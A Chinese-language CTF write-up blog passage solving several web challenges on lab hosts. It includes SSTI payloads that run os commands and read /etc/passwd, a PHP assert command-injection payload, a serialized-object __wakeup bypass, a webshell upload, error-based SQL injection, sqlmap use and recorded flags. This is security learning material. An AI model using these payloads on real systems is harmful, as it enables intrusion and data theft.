<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws</span><br></pre></td></tr></table></figure>


<p>str_rot13</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">n1mYotDfPRFRVdEYjhDNlZjYld2Y5IjOkdTN3EDNlhzM0gzZiFTZ2MjO4gjf</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fjg4OjM2ZTFiZzg0MzhlNDE3NTdkOjI5Y2dlYjZlNDhjYEdVRFRPfDtoYm1n</span><br></pre></td></tr></table></figure>
<p>base64_decode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">~88:36e1bg8438e41757d:29cgeb6e48c&#96;GUDTO|;hbmg</span><br></pre></td></tr></table></figure>
<p>ascii码减1</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>strrev</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag:&#123;NSCTF_b73d5adfb819c64603d7237fa0d52977&#125;</span><br></pre></td></tr></table></figure>
<p>或者用python代码写</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">import base64</span><br><span class="line"></span><br><span class="line">s0 &#x3D; &quot;a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws&quot;</span><br><span class="line">def rot13_decode(c):</span><br><span class="line">	if ord(c)&gt;&#x3D;ord(&#39;a&#39;) and ord(c)&lt;&#x3D;ord(&#39;z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;a&#39;)+13) % 26 + ord(&#39;a&#39;))</span><br><span class="line">	elif ord(c)&gt;&#x3D;ord(&#39;A&#39;) and ord(c)&lt;&#x3D;ord(&#39;Z&#39;):</span><br><span class="line">		return chr((ord(c)-ord(&#39;A&#39;)+13) % 26 + ord(&#39;A&#39;))</span><br><span class="line">	else:</span><br><span class="line">		return c</span><br><span class="line"></span><br><span class="line">def decodeM(s0):</span><br><span class="line">	s1 &#x3D; &quot;&quot;</span><br><span class="line">	for s in s0:</span><br><span class="line">		s1 +&#x3D; rot13_decode(s)</span><br><span class="line">		# print(s1)</span><br><span class="line">	print(type(s1))</span><br><span class="line">	s1 &#x3D; s1[::-1] # 这里很关键</span><br><span class="line">	s1&#x3D;base64.b64decode(s1)</span><br><span class="line">	s1&#x3D;str(s1,&#39;utf-8&#39;) #这里很关键</span><br><span class="line">	s2&#x3D;&quot;&quot;</span><br><span class="line">	for s in s1:</span><br><span class="line">		s2 +&#x3D; chr(ord(s) - 1)</span><br><span class="line">	s2&#x3D;s2[::-1]</span><br><span class="line">	print(s2)</span><br><span class="line"></span><br><span class="line">decodeM(s0)</span><br></pre></td></tr></table></figure>
<p>日了刚开始密文用str定义，死活写不出来</p>
<p>也可以用php直接写，也比较方便。略过。</p>
<h1 id="php2"><a href="#php2" class="headerlink" title="php2"></a>php2</h1><p>使用御剑扫描，只有一个index.php</p>
<p>根据wp，访问phps，得到php源码</p>
<p>阅读源码，发现通过id传入admin即可</p>
<p>考虑到上传时自动操作urldecode一次，php源码中urlcode一次，则对admin进行两次urlencode加密</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42773&#x2F;index.php?id&#x3D;%25%36%31%25%36%34%25%36%64%25%36%39%25%36%65</span><br></pre></td></tr></table></figure>
<p>注意此处，id=admin而不是”admin”</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;007cac75ed0e33c3a695f2e87b4da112&#125;</span><br></pre></td></tr></table></figure>
<h1 id="unserialize3"><a href="#unserialize3" class="headerlink" title="unserialize3"></a>unserialize3</h1><p>访问地址，得到php源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">class xctf&#123;</span><br><span class="line">public $flag &#x3D; &#39;111&#39;;</span><br><span class="line">public function __wakeup()&#123;</span><br><span class="line">exit(&#39;bad requests&#39;);</span><br><span class="line">&#125;</span><br><span class="line">?code&#x3D;</span><br></pre></td></tr></table></figure>
<p>根据题目名unserialize3和源码中出现的__wakeup函数，判断需要生成一个xctf的对象，然后将其序列化后赋值给code</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>根据wp，此处利用一个wakeup漏洞，即序列化字符串中属性个数大于真实属性个数时，会跳过wakeup的执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:47562&#x2F;index.php?code&#x3D;O:4:&quot;xctf&quot;:2:&#123;s:4:&quot;flag&quot;;s:3:&quot;111&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;e51c4424e28d385283c0deb1601cc47b&#125;</span><br></pre></td></tr></table></figure>
<h1 id="upload1"><a href="#upload1" class="headerlink" title="upload1"></a>upload1</h1><p>本题为文件上传</p>
<p>尝试上传一个php一句话木马，一选定文件，即弹框“请上传图片”。判断前端js做了后缀过滤，在firefox中把js禁掉</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">about:config</span><br><span class="line">搜索javascript:enabled，切换为false</span><br></pre></td></tr></table></figure>
<p>上传一个图片，发现会给出图片的地址。</p>
<p>尝试上传图片木马，失败。</p>
<p>直接上传php一句话木马，成功。使用菜刀链接后，可以找到flag.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;004bd6dd9c980a3ac47e680645f88133&#125;</span><br></pre></td></tr></table></figure>


<h1 id="web-python-template-injection"><a href="#web-python-template-injection" class="headerlink" title="web_python_template_injection"></a>web_python_template_injection</h1><p>题目提示是模板注入SSTI</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;1+2&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>1+2执行了，存在SSTI。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;%7B%7B&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)%7D%7D</span><br></pre></td></tr></table></figure>
<p>得知fl4g为flag所在地</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:59244&#x2F;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].popen(&#39;cat fl4g&#39;).read() &#125;&#125;</span><br><span class="line">或者</span><br><span class="line">&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;fl4g&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>


<h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><p>学习<a target="_blank" rel="noopener" href="https://www.freebuf.com/column/187845.html">https://www.freebuf.com/column/187845.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">模板注入一般指flask下jinja模板引擎的注入，&#123;&#123;&#125;&#125;是变量包裹标识符，可以传递变量，可以执行简单表达式</span><br></pre></td></tr></table></figure>

<h2 id="判断是否有SSTI"><a href="#判断是否有SSTI" class="headerlink" title="判断是否有SSTI"></a>判断是否有SSTI</h2><p>在URL末尾添加，3观察表达式是否执行</p>
<h2 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">__class__  返回类型所属的对象</span><br><span class="line">__mro__    返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。</span><br><span class="line">__base__   返回该对象所继承的基类</span><br><span class="line">&#x2F;&#x2F; __base__和__mro__都是用来寻找基类的</span><br><span class="line"></span><br><span class="line">__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表</span><br><span class="line">__init__  类的初始化方法</span><br><span class="line">__globals__  对包含函数全局变量的字典的引用</span><br></pre></td></tr></table></figure>
<h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#39;&#39;.__class__ # 获取字符串类对象</span><br><span class="line">&#39;&#39;.__class__.__mro__ # 寻找基类</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].subclasses__ # 寻找可用引用，其中type为file的可用</span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[40](&#39;&#x2F;etc&#x2F;passwd&#39;).read() # 第40个引用为file类型，可用于读取文件</span><br><span class="line"></span><br><span class="line">for item in &#39;&#39;.__class__.__mro__[2].__subclasses__():</span><br><span class="line">    try:</span><br><span class="line">         if &#39;os&#39; in item.__init__.__globals__: # 寻找包括os的引用，一般为71 &lt;class &#39;site._Printer&#39;&gt;</span><br><span class="line">             print num,item</span><br><span class="line">         num+&#x3D;1</span><br><span class="line">    except:</span><br><span class="line">        print &#39;-&#39;</span><br><span class="line">        num+&#x3D;1</span><br><span class="line"></span><br><span class="line">&#39;&#39;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&#39;os&#39;].system(&#39;ls&#39;)</span><br></pre></td></tr></table></figure>


<h1 id="easytornado"><a href="#easytornado" class="headerlink" title="easytornado"></a>easytornado</h1><p>观察URL，发现URL由filename和filehash构成</p>
<p>打开网页有三个文件flag.txt，welcome.txt，hints.txt，分别打开后得知flag在/fllllllllllllag下，filehash=md5(cookie_secret+md5(filename))。</p>
<p>根据wp，tornado框架下的cookie_secret在handler.settings中可以查看，通过SSTI查看</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:42386&#x2F;error?msg&#x3D;&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>根据公式计算filehash</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;fllllllllllllag   3bf9f6cf685a6dd8defadabfb41a03a1</span><br><span class="line">&#39;cookie_secret&#39;: &#39;e8e46546-9657-4f0c-9838-ac21f21f13cf&#39;</span><br><span class="line"></span><br><span class="line">1a87b4db9ccdf43a09e252f25982e4a3</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;3f39aea39db345769397ae895edb9c70&#125;</span><br></pre></td></tr></table></figure>
<h1 id="shrine"><a href="#shrine" class="headerlink" title="shrine"></a>shrine</h1><p>打开题目后阅读源码</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span> </span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line">	</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span> </span><br><span class="line">	<span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span> </span><br><span class="line">		s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">		blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line">		<span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line">	<span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<p>由关键词flask和jinja，判断是一道SSTI题</p>
<p>可以得知FLAG在config中</p>
<p>代码对SSTI注入的参数进行了两种过滤</p>
<ol>
<li>删除左括号(和右括号)</li>
<li>将变量config和self的值设置为None，简单来说就是不能直接访问config和self变量</li>
</ol>
<p>payload可以是下面任意一种</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;shrine&#x2F;&#123;&#123;url_for.__globals__[&quot;current_app&quot;].config&#125;&#125;</span><br><span class="line">&#x2F;shrine&#x2F;&#123;&#123;get_flashed_messages.__globals__[&#39;current_app&#39;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;shrine_is_good_ssti&#125;</span><br></pre></td></tr></table></figure>
<h2 id="SSTI常见内置函数和变量（flask）"><a href="#SSTI常见内置函数和变量（flask）" class="headerlink" title="SSTI常见内置函数和变量（flask）"></a>SSTI常见内置函数和变量（flask）</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">config</span><br><span class="line">　　config 对象就是Flask的config对象，也就是 app.config 对象</span><br><span class="line">request</span><br><span class="line">　　Flask中代表当前请求的request对象</span><br><span class="line">session</span><br><span class="line">　　Flask的session对象</span><br><span class="line">url_for()</span><br><span class="line">　　url_for会根据传入的路由器函数名,返回该路由对应的URL,在模板中始终使用url_for()就可以安全的修改路由绑定的URL,则不比担心模板中渲染出错的链接</span><br><span class="line">get_flashed_messages()</span><br><span class="line">　　这个函数会返回之前在flask中通过flask()传入的消息的列表，flash函数的作用很简单,可以把由Python字符串表示的消息加入一个消息队列中，再使用get_flashed_message()函数取出它们并消费掉</span><br></pre></td></tr></table></figure>
<h1 id="mfw"><a href="#mfw" class="headerlink" title="mfw"></a>mfw</h1><p>首先打开网页，发现有三个可以点击的地方，都试试之后，观察URL为</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;?page&#x3D;home</span><br></pre></td></tr></table></figure>
<p>形式。</p>
<p>根据wp，在about中提示使用了git，可以存在git泄露，于是访问</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:31715&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
<p>可以进入templates</p>
<p>使用githack.py进行下载，得到文件。存在flag文件，但是直接打开后没有东西，可能在下载时做了一些过滤。打开index.php文件</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;page&#39;])) &#123;</span><br><span class="line">	$page &#x3D; $_GET[&#39;page&#39;];</span><br><span class="line">&#125; else &#123;</span><br><span class="line">	$page &#x3D; &quot;home&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$file &#x3D; &quot;templates&#x2F;&quot; . $page . &quot;.php&quot;;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; I heard &#39;..&#39; is dangerous!</span><br><span class="line">assert(&quot;strpos(&#39;$file&#39;, &#39;..&#39;) &#x3D;&#x3D;&#x3D; false&quot;) or die(&quot;Detected hacking attempt!&quot;); # 此处是关键</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; TODO: Make this look nice</span><br><span class="line">assert(&quot;file_exists(&#39;$file&#39;)&quot;) or die(&quot;That file doesn&#39;t exist!&quot;);</span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">	&lt;head&gt;</span><br><span class="line">		&lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">		&lt;meta http-equiv&#x3D;&quot;X-UA-Compatible&quot; content&#x3D;&quot;IE&#x3D;edge&quot;&gt;</span><br><span class="line">		&lt;meta name&#x3D;&quot;viewport&quot; content&#x3D;&quot;width&#x3D;device-width, initial-scale&#x3D;1&quot;&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;title&gt;My PHP Website&lt;&#x2F;title&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;css&#x2F;bootstrap.min.css&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;head&gt;</span><br><span class="line">	&lt;body&gt;</span><br><span class="line">		&lt;nav class&#x3D;&quot;navbar navbar-inverse navbar-fixed-top&quot;&gt;</span><br><span class="line">			&lt;div class&#x3D;&quot;container&quot;&gt;</span><br><span class="line">		    	&lt;div class&#x3D;&quot;navbar-header&quot;&gt;</span><br><span class="line">		    		&lt;button type&#x3D;&quot;button&quot; class&#x3D;&quot;navbar-toggle collapsed&quot; data-toggle&#x3D;&quot;collapse&quot; data-target&#x3D;&quot;#navbar&quot; aria-expanded&#x3D;&quot;false&quot; aria-controls&#x3D;&quot;navbar&quot;&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;sr-only&quot;&gt;Toggle navigation&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		            	&lt;span class&#x3D;&quot;icon-bar&quot;&gt;&lt;&#x2F;span&gt;</span><br><span class="line">		          	&lt;&#x2F;button&gt;</span><br><span class="line">		          	&lt;a class&#x3D;&quot;navbar-brand&quot; href&#x3D;&quot;#&quot;&gt;Project name&lt;&#x2F;a&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		        &lt;div id&#x3D;&quot;navbar&quot; class&#x3D;&quot;collapse navbar-collapse&quot;&gt;</span><br><span class="line">		          	&lt;ul class&#x3D;&quot;nav navbar-nav&quot;&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;home&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;home&quot;&gt;Home&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;about&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;about&quot;&gt;About&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">		            	&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;contact&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;contact&quot;&gt;Contact&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;</span><br><span class="line">						&lt;!--&lt;li &lt;?php if ($page &#x3D;&#x3D; &quot;flag&quot;) &#123; ?&gt;class&#x3D;&quot;active&quot;&lt;?php &#125; ?&gt;&gt;&lt;a href&#x3D;&quot;?page&#x3D;flag&quot;&gt;My secrets&lt;&#x2F;a&gt;&lt;&#x2F;li&gt; --&gt;</span><br><span class="line">		          	&lt;&#x2F;ul&gt;</span><br><span class="line">		        &lt;&#x2F;div&gt;</span><br><span class="line">		    &lt;&#x2F;div&gt;</span><br><span class="line">		&lt;&#x2F;nav&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;div class&#x3D;&quot;container&quot; style&#x3D;&quot;margin-top: 50px&quot;&gt;</span><br><span class="line">			&lt;?php</span><br><span class="line">				require_once $file;</span><br><span class="line">			?&gt;</span><br><span class="line">			</span><br><span class="line">		&lt;&#x2F;div&gt;</span><br><span class="line">		</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;1.12.4&#x2F;jquery.min.js&quot; &#x2F;&gt;</span><br><span class="line">		&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;cdnjs.cloudflare.com&#x2F;ajax&#x2F;libs&#x2F;twitter-bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot; &#x2F;&gt;</span><br><span class="line">	&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>$file处是由page直接拼接成的，没有做过滤，此处可以注入</p>
<p>payload</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page&#x3D;abc&#39;) or system(&quot;cat templates&#x2F;flag.php&quot;);&#x2F;&#x2F;</span><br></pre></td></tr></table></figure>


<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyberpeace&#123;685f2fb4f05573221e5a84e0849fe433&#125;</span><br></pre></td></tr></table></figure>
<h1 id="fakebook"><a href="#fakebook" class="headerlink" title="fakebook"></a>fakebook</h1><p>考察：sql注入、SSRF、反序列化</p>
<p>打开网页，首先把整个注册登录流程走一遍。</p>
<p>注册用户后，进入登录界面，发现URL为此格式</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1</span><br></pre></td></tr></table></figure>
<p>考虑sql注入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;1 # 成功</span><br><span class="line">http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 and 1&#x3D;2 # 失败</span><br></pre></td></tr></table></figure>
<p>故存在注入点</p>
<h2 id="手工注入-1"><a href="#手工注入-1" class="headerlink" title="手工注入"></a>手工注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看返回列个数 &#x2F;view.php?no&#x3D;1 order by 4</span><br><span class="line">爆列名 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;&quot;users&quot;)),1)#</span><br><span class="line">爆字段 &#x2F;view.php?no&#x3D;1 and updatexml(1,make_set(3,&#39;~&#39;,(select data from users)),1)#</span><br></pre></td></tr></table></figure>
<p>返回这一串东西</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:1:&quot;1&quot;;s:3:&quot;age&quot;;i:1;s:4:&quot;blog&quot;;s:5:&quot;1.com&quot;;&#125; </span><br></pre></td></tr></table></figure>
<h2 id="sqlmap注入"><a href="#sqlmap注入" class="headerlink" title="sqlmap注入"></a>sqlmap注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;220.249.52.134:30590&#x2F;view.php?no&#x3D;1 --batch </span><br></pre></td></tr></table></figure>
<p>不知道为什么，在时间注入那卡死了，跳过。</p>
<p>访问/robots.txt，发现存在备份文件/user.php.bak</p>
<p>访问/user.php.bak</p>
